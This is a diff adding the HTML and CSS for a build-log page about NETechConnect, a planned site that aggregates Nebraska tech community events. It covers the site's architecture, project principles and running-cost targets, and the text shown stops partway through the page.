@@ -1,0 +1,1108 @@
+<title>NETechConnect Build Log</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="Building NETechConnect in public: one place to find every community tech event in Nebraska.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: a build log. Masthead + 10-phase rail on top, one tab per chapter below,
+   each chapter = summary, mechanism diagrams, what happened, a post to share. */
+:root {
+  --bg: #F3F5F2;
+  --surface: #FFFFFF;
+  --surface-2: #E8EEEA;
+  --ink: #15211C;
+  --muted: #56655E;
+  --line: #D3DBD6;
+  --gold: #B7791F;
+  --gold-ink: #835509;
+  --gold-soft: #F6E8CC;
+  --sky: #2C6A96;
+  --sky-soft: #DCEAF4;
+  --ok: #2F7D4F;
+  --ok-soft: #DDF0E3;
+  --bad: #B4372F;
+  --bad-soft: #F7DEDB;
+  --f-display: "Bricolage Grotesque", "Segoe UI", system-ui, sans-serif;
+  --f-body: "IBM Plex Sans", "Segoe UI", system-ui, sans-serif;
+  --f-mono: "IBM Plex Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
+  --radius: 10px;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0F1513; --surface: #161E1B; --surface-2: #1D2824; --ink: #E4EBE7; --muted: #97A69F;
+    --line: #2B3833; --gold: #E2A63F; --gold-ink: #F0C374; --gold-soft: #3A2E17; --sky: #6FA9D4;
+    --sky-soft: #17293A; --ok: #5DBE86; --ok-soft: #17301F; --bad: #E87A70; --bad-soft: #3A1C19;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0F1513; --surface: #161E1B; --surface-2: #1D2824; --ink: #E4EBE7; --muted: #97A69F;
+  --line: #2B3833; --gold: #E2A63F; --gold-ink: #F0C374; --gold-soft: #3A2E17; --sky: #6FA9D4;
+  --sky-soft: #17293A; --ok: #5DBE86; --ok-soft: #17301F; --bad: #E87A70; --bad-soft: #3A1C19;
+  color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--ink);
+  font-family: var(--f-body);
+  font-size: 16px;
+  line-height: 1.6;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  padding-block: 0 64px;
+}
+.wrap { max-width: 1080px; margin: 0 auto; }
+a { color: var(--sky); text-underline-offset: 3px; }
+a:hover { color: var(--ink); }
+:focus-visible { outline: 3px solid var(--gold); outline-offset: 2px; border-radius: 4px; }
+h1, h2, h3 { font-family: var(--f-display); line-height: 1.15; text-wrap: balance; margin: 0; }
+h2 { font-size: clamp(1.6rem, 3.2vw, 2.1rem); font-weight: 800; letter-spacing: -0.01em; }
+h3 { font-size: 1.2rem; font-weight: 700; }
+p { margin: 0; }
+.eyebrow {
+  font-family: var(--f-mono); font-size: 0.75rem; letter-spacing: 0.08em; text-transform: uppercase;
+  color: var(--muted);
+}
+.lede { font-size: 1.125rem; max-width: 65ch; color: var(--ink); }
+.prose { max-width: 68ch; display: grid; gap: 12px; }
+.muted { color: var(--muted); }
+code, .mono { font-family: var(--f-mono); font-size: 0.9em; }
+code { background: var(--surface-2); padding: 1px 5px; border-radius: 4px; }
+
+/* ---------- Masthead ---------- */
+.masthead { padding-block: 40px 28px; display: grid; gap: 16px; }
+.masthead h1 { font-size: clamp(2.2rem, 6vw, 3.6rem); font-weight: 800; letter-spacing: -0.02em; max-width: 18ch; }
+.masthead h1 .accent { color: var(--gold-ink); }
+.meta { display: flex; flex-wrap: wrap; gap: 8px 20px; font-size: 0.9rem; color: var(--muted); }
+.meta strong { color: var(--ink); font-weight: 600; }
+
+/* Phase rail: the whole roadmap at a glance */
+.rail { margin-top: 8px; }
+.rail ol { list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: repeat(10, minmax(0, 1fr)); gap: 6px; }
+.rail li { display: grid; gap: 6px; min-width: 0; }
+.rail .bar { height: 8px; border-radius: 4px; background: var(--surface-2); border: 1px solid var(--line); position: relative; overflow: hidden; }
+.rail .bar span { position: absolute; inset: 0 auto 0 0; background: var(--gold); }
+.rail li.done .bar { background: var(--ok); border-color: var(--ok); }
+.rail .lbl { font-size: 0.72rem; line-height: 1.3; color: var(--muted); }
+.rail .lbl b { display: block; font-family: var(--f-mono); font-weight: 500; color: var(--ink); }
+.rail li.now .lbl b { color: var(--gold-ink); }
+.rail-key { display: flex; flex-wrap: wrap; gap: 6px 18px; margin-top: 10px; font-size: 0.8rem; color: var(--muted); }
+.rail-key i { display: inline-block; width: 18px; height: 8px; border-radius: 3px; margin-right: 6px; vertical-align: middle; border: 1px solid var(--line); background: var(--surface-2); }
+.rail-key .k-done { background: var(--ok); border-color: var(--ok); }
+.rail-key .k-now { background: linear-gradient(90deg, var(--gold) 30%, var(--surface-2) 30%); }
+@media (max-width: 720px) {
+  .rail ol { grid-template-columns: repeat(5, minmax(0, 1fr)); row-gap: 14px; }
+}
+
+/* ---------- Tabs ---------- */
+.tabs {
+  position: sticky; top: env(safe-area-inset-top, 0px); z-index: 5;
+  background: var(--bg); border-bottom: 1px solid var(--line);
+  display: flex; gap: 4px; overflow-x: auto; scrollbar-width: thin;
+  margin-inline: calc(-1 * max(16px, env(safe-area-inset-left, 0px)));
+  padding-inline: max(16px, env(safe-area-inset-left, 0px));
+}
+body::before { content: ""; position: fixed; inset: 0 0 auto; height: env(safe-area-inset-top, 0px); z-index: 10; background: var(--bg); }
+.tab {
+  appearance: none; border: 0; background: none; cursor: pointer; white-space: nowrap;
+  font: 600 0.95rem/1 var(--f-body); color: var(--muted);
+  padding: 16px 14px 14px; border-bottom: 3px solid transparent;
+  display: inline-flex; align-items: center; gap: 8px;
+}
+.tab:hover { color: var(--ink); }
+.tab[aria-selected="true"] { color: var(--ink); border-bottom-color: var(--gold); }
+.tab .pill { font: 500 0.68rem/1 var(--f-mono); padding: 4px 6px; border-radius: 999px; background: var(--surface-2); color: var(--muted); }
+.tab .pill.ok { background: var(--ok-soft); color: var(--ok); }
+.tab .pill.now { background: var(--gold-soft); color: var(--gold-ink); }
+
+.panel { padding-top: 36px; display: grid; gap: 48px; }
+.panel > section { display: grid; gap: 18px; min-width: 0; }
+.section-head { display: grid; gap: 6px; }
+
+/* ---------- Shared pieces ---------- */
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 12px; }
+.stat { background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 16px 18px; display: grid; gap: 4px; align-content: start; }
+.stat .n { font-family: var(--f-display); font-size: 2rem; font-weight: 800; line-height: 1.1; font-variant-numeric: tabular-nums; }
+.stat .n small { font-size: 1rem; font-weight: 700; color: var(--muted); }
+.stat p { font-size: 0.9rem; color: var(--muted); }
+
+figure { margin: 0; display: grid; gap: 10px; min-width: 0; }
+figcaption { font-size: 0.9rem; color: var(--muted); max-width: 75ch; }
+.diagram { background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 16px; overflow-x: auto; }
+.diagram svg { display: block; width: 100%; height: auto; }
+.diagram.wide svg { min-width: 760px; }
+.diagram.xwide svg { min-width: 860px; }
+
+/* SVG theming through tokens */
+svg text { font-family: var(--f-body); fill: var(--ink); }
+svg .t-title { font-size: 13px; font-weight: 600; }
+svg .t-sub { font-size: 11px; fill: var(--muted); }
+svg .t-head { font-family: var(--f-mono); font-size: 10.5px; letter-spacing: 0.08em; fill: var(--muted); }
+svg .t-edge { font-size: 11px; fill: var(--muted); }
+svg .t-accent { font-size: 11.5px; font-weight: 600; fill: var(--gold-ink); }
+svg .t-ok { font-size: 10px; font-weight: 600; fill: var(--ok); font-family: var(--f-mono); }
+svg .box { fill: var(--surface); stroke: var(--line); stroke-width: 1.5; }
+svg .box-2 { fill: var(--surface-2); stroke: var(--line); stroke-width: 1.5; }
+svg .box-accent { fill: var(--gold-soft); stroke: var(--gold); stroke-width: 1.5; }
+svg .box-ok { fill: var(--ok-soft); stroke: var(--ok); stroke-width: 1.5; }
+svg .box-bad { fill: var(--bad-soft); stroke: var(--bad); stroke-width: 1.5; }
+svg .edge { stroke: var(--muted); stroke-width: 1.5; fill: none; }
+svg .edge-accent { stroke: var(--gold); stroke-width: 2.5; fill: none; }
+svg .edge-dash { stroke: var(--muted); stroke-width: 1.2; fill: none; stroke-dasharray: 4 4; }
+svg .head { fill: var(--muted); }
+svg .head-accent { fill: var(--gold); }
+
+.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 12px; }
+.card { background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 16px 18px; display: grid; gap: 6px; align-content: start; min-width: 0; }
+.card h3 { font-size: 1.05rem; }
+.card p { font-size: 0.93rem; color: var(--muted); }
+.card .tag { font: 500 0.72rem/1 var(--f-mono); color: var(--muted); }
+
+.two { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px; align-items: start; }
+
+/* Process chain (a real sequence, so numbered) */
+.chain { list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 10px; counter-reset: step; }
+.chain li { counter-increment: step; background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 14px; display: grid; gap: 4px; align-content: start; position: relative; min-width: 0; }
+.chain li::before { content: counter(step); font: 500 0.75rem/1 var(--f-mono); color: var(--gold-ink); }
+.chain li b { font-family: var(--f-display); font-size: 1.05rem; }
+.chain li span { font-size: 0.85rem; color: var(--muted); }
+.chain li.here { border-color: var(--gold); box-shadow: inset 0 0 0 1px var(--gold); }
+@media (max-width: 760px) { .chain { grid-template-columns: 1fr 1fr; } }
+
+/* Roadmap table */
+.table-wrap { overflow-x: auto; border: 1px solid var(--line); border-radius: var(--radius); background: var(--surface); }
+table { border-collapse: collapse; width: 100%; font-size: 0.93rem; }
+th, td { text-align: left; padding: 10px 14px; border-bottom: 1px solid var(--line); vertical-align: top; }
+th { font: 500 0.72rem/1.2 var(--f-mono); letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted); background: var(--surface-2); }
+tr:last-child td { border-bottom: 0; }
+td.num { font-family: var(--f-mono); color: var(--muted); white-space: nowrap; }
+.status { display: inline-flex; align-items: center; gap: 6px; font-size: 0.8rem; font-weight: 600; white-space: nowrap; }
+.status::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--line); }
+.status.done { color: var(--ok); } .status.done::before { background: var(--ok); }
+.status.now { color: var(--gold-ink); } .status.now::before { background: var(--gold); }
+.status.next { color: var(--muted); }
+
+/* Checklist of sub-sections within a phase */
+.checklist { list-style: none; margin: 0; padding: 0; display: grid; gap: 8px; }
+.checklist li { display: grid; grid-template-columns: auto 1fr auto; gap: 12px; align-items: center; background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 12px 14px; }
+.checklist .mark { width: 22px; height: 22px; border-radius: 50%; display: grid; place-items: center; font-size: 0.75rem; font-weight: 700; border: 2px solid var(--line); color: var(--muted); }
+.checklist li.done .mark { background: var(--ok); border-color: var(--ok); color: var(--surface); }
+.checklist li.wait .mark { border-color: var(--gold); color: var(--gold-ink); }
+.checklist b { font-weight: 600; }
+.checklist small { display: block; color: var(--muted); font-size: 0.85rem; }
+.checklist .ids { font: 500 0.75rem/1 var(--f-mono); color: var(--muted); white-space: nowrap; }
+
+/* Story notes */
+.notes { display: grid; gap: 14px; }
+.note { display: grid; grid-template-columns: 4px 1fr; gap: 16px; }
+.note::before { content: ""; background: var(--line); border-radius: 2px; }
+.note.hi::before { background: var(--gold); }
+.note h3 { font-size: 1.05rem; margin-bottom: 4px; }
+.note p { color: var(--muted); max-width: 70ch; }
+
+/* Interactive request walkthrough */
+.scenarios { display: flex; flex-wrap: wrap; gap: 8px; }
+.chip {
+  appearance: none; cursor: pointer; font: 500 0.88rem/1.2 var(--f-body);
+  background: var(--surface); color: var(--ink); border: 1px solid var(--line);
+  border-radius: 999px; padding: 8px 14px;
+}
+.chip:hover { border-color: var(--muted); }
+.chip[aria-pressed="true"] { background: var(--ink); color: var(--bg); border-color: var(--ink); }
+.walk { display: grid; grid-template-columns: minmax(0, 1fr); gap: 14px; }
+#flow .node rect { fill: var(--surface); stroke: var(--line); stroke-width: 1.5; transition: fill .25s, stroke .25s; }
+#flow .node.is-pass rect { fill: var(--ok-soft); stroke: var(--ok); }
+#flow .node.is-fail rect { fill: var(--bad-soft); stroke: var(--bad); stroke-width: 2.5; }
+#flow .node.is-dim { opacity: 0.45; }
+#flow .refused rect { fill: var(--surface-2); stroke: var(--line); stroke-dasharray: 5 4; }
+#flow .refused.is-fail rect { fill: var(--bad-soft); stroke: var(--bad); stroke-dasharray: none; }
+#flow .redirect { stroke: var(--line); stroke-width: 1.5; fill: none; stroke-dasharray: 5 4; }
+#flow .redirect.is-active { stroke: var(--gold); stroke-width: 2.5; stroke-dasharray: none; }
+.steps { list-style: none; margin: 0; padding: 0; display: grid; gap: 6px; counter-reset: s; }
+.steps li { counter-increment: s; display: grid; grid-template-columns: 28px 1fr; gap: 8px; font-size: 0.93rem; align-items: baseline; }
+.steps li::before { content: counter(s); font: 500 0.75rem/1 var(--f-mono); color: var(--muted); text-align: right; }
+.steps .v-pass { color: var(--ok); font-weight: 600; }
+.steps .v-fail { color: var(--bad); font-weight: 600; }
+.steps .v-redirect { color: var(--gold-ink); font-weight: 600; }
+.verdict { font-weight: 600; padding: 10px 14px; border-radius: var(--radius); border: 1px solid var(--line); background: var(--surface); }
+.verdict.ok { border-color: var(--ok); color: var(--ok); background: var(--ok-soft); }
+.verdict.bad { border-color: var(--bad); color: var(--bad); background: var(--bad-soft); }
+
+/* Address ranges */
+.ranges { display: flex; flex-wrap: wrap; gap: 6px; }
+.ranges span { font: 500 0.8rem/1 var(--f-mono); padding: 7px 9px; border-radius: 6px; background: var(--bad-soft); color: var(--bad); border: 1px solid transparent; }
+
+/* Before / after */
+.ba { display: grid; grid-template-columns: minmax(0, 1fr) auto minmax(0, 1fr); gap: 14px; align-items: stretch; }
+.ba .arrow { align-self: center; font: 700 1.4rem/1 var(--f-display); color: var(--gold); }
+.code {
+  margin: 0; background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius);
+  padding: 14px 16px; font: 400 0.8rem/1.6 var(--f-mono); overflow-x: auto; white-space: pre; color: var(--ink);
+}
+.code .danger { color: var(--bad); }
+.result { background: var(--ok-soft); border: 1px solid var(--ok); border-radius: var(--radius); padding: 14px 16px; display: grid; gap: 8px; align-content: start; }
+.result .lbl, .code-lbl { font: 500 0.72rem/1 var(--f-mono); letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted); }
+.result p { font-size: 1rem; }
+@media (max-width: 760px) { .ba { grid-template-columns: minmax(0, 1fr); } .ba .arrow { transform: rotate(90deg); justify-self: center; } }
+
+.mini { width: 100%; border-collapse: collapse; font-size: 0.88rem; }
+.mini td { padding: 8px 10px; border-bottom: 1px solid var(--line); vertical-align: top; }
+.mini td:first-child { font-family: var(--f-mono); font-size: 0.8rem; word-break: break-all; }
+.mini tr:last-child td { border-bottom: 0; }
+.drop { color: var(--bad); font-weight: 600; }
+.keep { color: var(--ok); font-weight: 600; }
+
+/* Speed-up headline */
+.speed { display: grid; grid-template-columns: auto auto 1fr; gap: 10px 22px; align-items: center; background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 18px 20px; }
+.speed .big { font-family: var(--f-display); font-weight: 800; font-size: clamp(2rem, 5vw, 2.8rem); line-height: 1; font-variant-numeric: tabular-nums; }
+.speed .before { color: var(--bad); }
+.speed .after { color: var(--ok); }
+.speed .cap { font-size: 0.8rem; color: var(--muted); display: block; margin-top: 6px; font-family: var(--f-mono); }
+.speed p { color: var(--muted); font-size: 0.93rem; }
+@media (max-width: 640px) { .speed { grid-template-columns: 1fr 1fr; } .speed p { grid-column: 1 / -1; } }
+
+/* Chart */
+.chart-box { background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 16px; position: relative; }
+#tests-chart .grid { stroke: var(--line); stroke-width: 1; }
+#tests-chart .axis { font-family: var(--f-mono); font-size: 11px; fill: var(--muted); }
+#tests-chart .bar { fill: var(--gold); }
+#tests-chart .bar-hit { fill: transparent; cursor: default; }
+#tests-chart .bar-hit:hover + .bar, #tests-chart .bar.is-hover { fill: var(--gold-ink); }
+#tests-chart .val { font-family: var(--f-mono); font-size: 12px; font-weight: 500; fill: var(--ink); }
+.tip { position: absolute; pointer-events: none; background: var(--ink); color: var(--bg); font-size: 0.8rem; padding: 6px 9px; border-radius: 6px; white-space: nowrap; transform: translate(-50%, -110%); }
+details.data { font-size: 0.88rem; }
+details.data summary { cursor: pointer; color: var(--muted); }
+details.data table { margin-top: 8px; font-size: 0.85rem; }
+
+/* Share */
+.share { background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 18px; display: grid; gap: 12px; }
+.share-head { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 10px; }
+.share textarea {
+  width: 100%; min-height: 220px; resize: vertical; font: 400 0.93rem/1.55 var(--f-body);
+  background: var(--bg); color: var(--ink); border: 1px solid var(--line); border-radius: 8px; padding: 12px 14px;
+}
+.btn {
+  appearance: none; cursor: pointer; font: 600 0.9rem/1 var(--f-body); color: var(--bg); background: var(--ink);
+  border: 0; border-radius: 8px; padding: 10px 16px;
+}
+.btn:hover { opacity: 0.9; }
+.share .count { font: 400 0.8rem/1 var(--f-mono); color: var(--muted); }
+
+.foot { margin-top: 56px; padding-top: 18px; border-top: 1px solid var(--line); font-size: 0.85rem; color: var(--muted); display: flex; flex-wrap: wrap; gap: 8px 20px; justify-content: space-between; }
+
+@media (prefers-reduced-motion: reduce) { * { transition: none !important; animation: none !important; } }
+</style>
+
+<div class="wrap">
+
+<header class="masthead">
+  <p class="eyebrow">NETechConnect &middot; build log</p>
+  <h1>Every Nebraska tech event, <span class="accent">in one place.</span></h1>
+  <p class="lede">I'm building NETechConnect in public: a free site that finds community tech events across Nebraska automatically and sends you to the organizer's page to sign up. This log follows the build one phase at a time.</p>
+  <div class="meta">
+    <span>Started <strong>Oct 16, 2026</strong></span>
+    <span>Now in <strong>Phase 2 of 10</strong></span>
+    <span>Repo <a href="https://github.com/timbertino1/CommunityTechConnect">timbertino1/CommunityTechConnect</a></span>
+  </div>
+
+  <nav class="rail" aria-label="Roadmap progress">
+    <ol>
+      <li class="done"><div class="bar"></div><div class="lbl"><b>01</b>Setup</div></li>
+      <li class="now"><div class="bar"><span style="width:26%"></span></div><div class="lbl"><b>02</b>Foundation</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>03</b>Event list</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>04</b>Find new groups</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>05</b>Calendar</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>06</b>Filters</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>07</b>Past events</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>08</b>Admin tools</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>09</b>Suggestions</div></li>
+      <li><div class="bar"></div><div class="lbl"><b>10</b>Polish &amp; launch</div></li>
+    </ol>
+    <div class="rail-key"><span><i class="k-done"></i>Done</span><span><i class="k-now"></i>In progress (Phase 2: 7 of 27 tasks)</span><span><i></i>Up next</span></div>
+  </nav>
+</header>
+
+<div class="tabs" role="tablist" aria-label="Build log chapters">
+  <button class="tab" role="tab" id="tab-project" aria-controls="project" aria-selected="true">The project</button>
+  <button class="tab" role="tab" id="tab-phase-1" aria-controls="phase-1" aria-selected="false" tabindex="-1">Phase 1 &middot; Setup <span class="pill ok">done</span></button>
+  <button class="tab" role="tab" id="tab-phase-2" aria-controls="phase-2" aria-selected="false" tabindex="-1">Phase 2 &middot; Foundation <span class="pill now">in progress</span></button>
+</div>
+
+<!-- ======================================================= THE PROJECT -->
+<main>
+<div class="panel" role="tabpanel" id="project" aria-labelledby="tab-project">
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">What it is</p>
+      <h2>A calendar for Nebraska's tech community that keeps itself up to date</h2>
+    </div>
+    <div class="two">
+      <div class="prose">
+        <p>NETechConnect lists community tech events across Nebraska, starting with Omaha and Lincoln: meetups, user groups, conferences, workshops and hack nights. You can see what's coming up in a list or on a calendar and filter by city and topic, from AI and security to cloud, data and career events.</p>
+        <p>Nobody has to type events in. The site finds them by itself every day, including events from groups it has never heard of, and every listing links to the organizer's own page, where you read the details and register.</p>
+      </div>
+      <div class="prose">
+        <h3>Why it exists</h3>
+        <p>Nebraska has a lot going on in tech, but it's scattered across Meetup, Eventbrite, Luma, university calendars, chamber sites, newsletters and word of mouth. Newcomers don't know where to look, and small groups are easy to miss.</p>
+        <p>NETechConnect brings it together in one free, fast, ad-free place, with no account needed and no personal data collected.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">How it works</p>
+      <h2>From scattered listings to one page</h2>
+    </div>
+    <figure>
+      <div class="diagram xwide">
+        <svg viewBox="0 0 1040 404" role="img" aria-label="Architecture: event sources are read daily by a discovery job on GitHub Actions, which cleans, classifies and de-duplicates them, opens a pull request with data changes, and the merged data builds a static site on Cloudflare Pages. Visitors follow each event's link to the organizer's page. Cloudflare Workers collect suggested groups and newsletter email for the next discovery run.">
+          <defs>
+            <marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" class="head"/></marker>
+            <marker id="ah-acc" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" class="head-accent"/></marker>
+          </defs>
+
+          <text class="t-head" x="20" y="28">WHERE EVENTS LIVE</text>
+          <text class="t-head" x="262" y="28">DISCOVERY &#183; DAILY, GITHUB ACTIONS</text>
+          <text class="t-head" x="566" y="28">DATA IN THE REPO</text>
+          <text class="t-head" x="806" y="28">WHAT VISITORS SEE</text>
+
+          <!-- Sources -->
+          <rect class="box" x="20" y="48" width="196" height="54" rx="8"/>
+          <text class="t-title" x="34" y="70">Group sites &amp; calendars</text>
+          <text class="t-sub" x="34" y="88">iCal &#183; RSS &#183; event pages</text>
+          <rect class="box" x="20" y="116" width="196" height="54" rx="8"/>
+          <text class="t-title" x="34" y="138">Event platforms</text>
+          <text class="t-sub" x="34" y="156">Meetup &#183; Luma &#183; Eventbrite</text>
+          <rect class="box" x="20" y="184" width="196" height="54" rx="8"/>
+          <text class="t-title" x="34" y="206">Newsletters &amp; news</text>
+          <text class="t-sub" x="34" y="224">email &#183; local tech RSS</text>
+          <rect class="box" x="20" y="252" width="196" height="54" rx="8"/>
+          <text class="t-title" x="34" y="274">Web search</text>
+          <text class="t-sub" x="34" y="292">finds unknown groups weekly</text>
+
+          <line class="edge" x1="216" y1="75" x2="260" y2="75" marker-end="url(#ah)"/>
+          <line class="edge" x1="216" y1="143" x2="260" y2="143" marker-end="url(#ah)"/>
+          <line class="edge" x1="216" y1="211" x2="260" y2="211" marker-end="url(#ah)"/>
+          <line class="edge" x1="216" y1="279" x2="260" y2="279" marker-end="url(#ah)"/>
+          <text class="t-edge" x="238" y="68" text-anchor="middle">reads</text>
+
+          <!-- Discovery -->
+          <rect class="box-2" x="262" y="44" width="262" height="270" rx="10"/>
+          <rect class="box" x="280" y="58" width="226" height="50" rx="7"/>
+          <text class="t-title" x="294" y="79">Safe fetch</text>
+          <text class="t-sub" x="294" y="96">blocks internal addresses, polite</text>
+          <text class="t-ok" x="496" y="79" text-anchor="end">BUILT</text>
+          <rect class="box" x="280" y="122" width="226" height="50" rx="7"/>
+          <text class="t-title" x="294" y="143">Clean</text>
+          <text class="t-sub" x="294" y="160">plain text, safe links only</text>
+          <text class="t-ok" x="496" y="143" text-anchor="end">BUILT</text>
+          <rect class="box" x="280" y="186" width="226" height="50" rx="7"/>
+          <text class="t-title" x="294" y="207">Classify</text>
+          <text class="t-sub" x="294" y="224">rules first, AI only if unclear</text>
+          <rect class="box" x="280" y="250" width="226" height="50" rx="7"/>
+          <text class="t-title" x="294" y="271">Merge duplicates</text>
+          <text class="t-sub" x="294" y="288">one event, many listings</text>
+          <line class="edge" x1="393" y1="108" x2="393" y2="120" marker-end="url(#ah)"/>
+          <line class="edge" x1="393" y1="172" x2="393" y2="184" marker-end="url(#ah)"/>
+          <line class="edge" x1="393" y1="236" x2="393" y2="248" marker-end="url(#ah)"/>
+
+          <!-- Data -->
+          <rect class="box" x="566" y="58" width="196" height="50" rx="8"/>
+          <text class="t-title" x="580" y="79">data/ on main</text>
+          <text class="t-sub" x="580" y="96">events &#183; sources &#183; reviews</text>
+          <rect class="box" x="566" y="186" width="196" height="64" rx="8"/>
+          <text class="t-title" x="580" y="208">Pull request</text>
+          <text class="t-sub" x="580" y="226">data changes only,</text>
+          <text class="t-sub" x="580" y="241">checked by CI</text>
+          <line class="edge" x1="524" y1="218" x2="564" y2="218" marker-end="url(#ah)"/>
+          <text class="t-edge" x="545" y="211" text-anchor="middle">opens</text>
+          <line class="edge" x1="664" y1="186" x2="664" y2="110" marker-end="url(#ah)"/>
+          <text class="t-edge" x="672" y="146">merges</text>
+          <text class="t-edge" x="672" y="160">if green</text>
+
+          <!-- Site -->
+          <rect class="box" x="806" y="58" width="214" height="50" rx="8"/>
+          <text class="t-title" x="820" y="79">Build static site</text>
+          <text class="t-sub" x="820" y="96">list &#183; calendar &#183; filters</text>
+          <rect class="box" x="806" y="134" width="214" height="50" rx="8"/>
+          <text class="t-title" x="820" y="155">Cloudflare Pages</text>
+          <text class="t-sub" x="820" y="172">fast, free hosting</text>
+          <rect class="box" x="806" y="210" width="214" height="50" rx="8"/>
+          <text class="t-title" x="820" y="231">Visitor</text>
+          <text class="t-sub" x="820" y="248">browses, no account</text>
+          <rect class="box-accent" x="806" y="300" width="214" height="54" rx="8"/>
+          <text class="t-title" x="820" y="322">Organizer's own page</text>
+          <text class="t-sub" x="820" y="340">full details &amp; registration</text>
+          <line class="edge" x1="762" y1="83" x2="804" y2="83" marker-end="url(#ah)"/>
+          <text class="t-edge" x="784" y="76" text-anchor="middle">builds</text>
+          <line class="edge" x1="913" y1="108" x2="913" y2="132" marker-end="url(#ah)"/>
+          <text class="t-edge" x="921" y="125">deploys</text>
+          <line class="edge" x1="913" y1="184" x2="913" y2="208" marker-end="url(#ah)"/>
+          <text class="t-edge" x="921" y="201">serves</text>
+          <line class="edge-accent" x1="913" y1="260" x2="913" y2="297" marker-end="url(#ah-acc)"/>
+          <text class="t-accent" x="923" y="284">View and register</text>
+
+          <!-- Workers -->
+          <rect class="box" x="566" y="330" width="196" height="58" rx="8"/>
+          <text class="t-title" x="580" y="353">Cloudflare Workers</text>
+          <text class="t-sub" x="580" y="371">suggestions &#183; newsletter email</text>
+          <path class="edge" d="M806 245 H784 V359 H764" marker-end="url(#ah)"/>
+          <text class="t-edge" x="778" y="300" text-anchor="end">suggests</text>
+          <text class="t-edge" x="778" y="314" text-anchor="end">a group</text>
+          <path class="edge" d="M566 359 H393 V316" marker-end="url(#ah)"/>
+          <text class="t-edge" x="480" y="351" text-anchor="middle">private inbox, read daily</text>
+        </svg>
+      </div>
+      <figcaption>Once a day, a discovery job reads public event sources, cleans and sorts what it finds, and proposes the changes as a pull request. When the automatic checks pass, the data merges and the site rebuilds. Visitors never register on NETechConnect: the gold arrow always leads to the organizer's own page.</figcaption>
+    </figure>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">The ground rules</p>
+      <h2>Seven principles every change has to follow</h2>
+      <p class="muted prose">They're written down in the project's constitution before any code, and every phase is checked against them.</p>
+    </div>
+    <div class="cards">
+      <div class="card"><span class="tag">I &middot; non-negotiable</span><h3>Security by default</h3><p>Everything from the outside is untrusted. No secrets in the repo, HTTPS only, least privilege everywhere.</p></div>
+      <div class="card"><span class="tag">II &middot; non-negotiable</span><h3>Aggregator, not organizer</h3><p>No RSVPs, tickets or accounts. Every event links back to where it really lives.</p></div>
+      <div class="card"><span class="tag">III</span><h3>Nebraska community scope</h3><p>Community tech events with a real Nebraska connection. No sales webinars.</p></div>
+      <div class="card"><span class="tag">IV</span><h3>Accurate, attributed data</h3><p>Correct times in Central Time, the source always credited, cancellations shown.</p></div>
+      <div class="card"><span class="tag">V</span><h3>Responsible discovery</h3><p>Respect robots.txt and site terms, go slow, and never let one broken source take the site down.</p></div>
+      <div class="card"><span class="tag">VI</span><h3>Test-first quality</h3><p>Tests are written before the code they check, and every change runs them automatically.</p></div>
+      <div class="card"><span class="tag">VII</span><h3>Accessible and simple</h3><p>Fast on a phone, usable with a screen reader or keyboard, no clutter.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-head">
+      <p class="eyebrow">How it's built</p>
+      <h2>Small, cheap and boring on purpose</h2>
+    </div>
+    <div class="stats">
+      <div class="stat"><span class="n">~$1<small>/month</small></span><p>Target running cost, with a hard ceiling of about $5. Free tiers do the heavy lifting.</p></div>
+      <div class="stat"><span class="n">0</span><p>Servers to run. A static site plus two tiny edge functions.</p></div>
+      <div class="stat"><span class="n">&le;15<small> min/week</small></span><p>Target admin time: reviewing new sources from a checklist in GitHub.</p></div>
+      <div class="stat"><span class="n">&le;24<small> h</small></span><p>How quickly a new or changed event should show up on the site.</p></div>
+    </div>
